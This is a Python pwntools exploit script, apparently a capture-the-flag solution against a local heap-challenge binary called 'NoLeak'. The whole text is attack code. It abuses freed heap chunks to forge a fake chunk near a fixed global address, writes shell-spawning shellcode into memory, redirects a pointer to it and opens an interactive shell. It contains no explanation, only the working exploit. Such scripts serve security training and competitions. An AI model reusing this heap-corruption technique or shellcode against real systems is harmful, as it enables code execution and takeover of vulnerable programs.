from pwn import *
bin=ELF("./NoLeak")
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c):	
	cmd(1)
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",c.ljust(size,"\0"))
def remove(idx):
	cmd(2)
	p.sendlineafter("Index: ",str(idx))
def edit(idx,size,c):
	cmd(3)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",c.ljust(size,"\0"))


#context.log_level="debug"
p=process("./NoLeak")


add(0x68,"AAAA")
add(0x68,"BBBB")
remove(1)	
payload=p64(0x601000-11)
edit(1,0x8,payload)
add(0x68,"CCCC")
add(0x68,"")	

add(0x68,'a')#0
add(0x68,'b')#1
add(0x88,'c')#2
add(0x68,'d')#4

remove(2)
remove(1)
remove(0)

edit(0,1,'\xc0')
edit(1,0x70,0x68*"A"+p64(0x71))
edit(2,1,'\x05')#use 0x7f to build fake chunk

add(0x68,"A")
add(0x68,"B")
add(0x68,"XXXX")
context.arch="amd64"
shellcode=asm(shellcraft.sh())
sh=0x601005
off=0x601078-0x601005
shellcode=shellcode.ljust(off,"\0")+"\x10"
edit(3,len(shellcode),shellcode)
edit(7,8,p64(sh))

cmd(1)
p.sendlineafter("Size: ","1")
p.interactive(">")